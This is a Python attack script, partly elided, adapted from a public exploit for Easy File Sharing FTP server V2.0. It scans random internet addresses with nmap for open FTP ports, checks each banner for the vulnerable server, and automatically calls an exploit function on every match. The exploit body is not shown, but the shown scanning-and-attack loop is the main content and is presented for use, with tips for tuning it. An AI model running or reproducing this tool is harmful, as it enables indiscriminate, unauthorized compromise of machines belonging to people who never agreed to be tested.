#!/usr/bin/python
#Modified Winny Thomas EFS exploit to scan(uses nmap) for random open ftp ports then 
#check the banner for EFS server, if found, exploit it...
#http://www.milw0rm.com/exploits/3579
...
if len(sys.argv) != 2:
	print "Usage: ./EFSscan.py <How many ips would you like to scan?>"
	sys.exit(1)
else:
	num=sys.argv[1]
	
	print "\n   d3hydr8[at]gmail[dot]com EFSScan v1.0"
	print "--------------------------------------------------"
	print "+ Target: Easy File Sharing FTP server V2.0"
	...
	while count != int(num):
		count += 1
		print "Trying:",count,"of",num
		#Change your nmap arguments, if you want.
		nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 -p 21 -iR 1 | grep -B 4 open')[1]).readlines()
		for tmp in nmap:
			if re.search("21/tcp\s+(?=open)", tmp):
				port = int(21)
		for tmp in nmap:
			...
			if ipaddr:
				...
				try:
					...
					s.close()	
					#Change this to whatever EFS banner looks like. (use lowercase)	
					if re.search("easy file", response.lower()): 
						print "\n\t\tEFS server found in banner, attempting to exploit...\n"
						ExploitFTP(host)
					else: print "\tNo Match:",response,"\n"
				except(socket.error,NameError), msg:
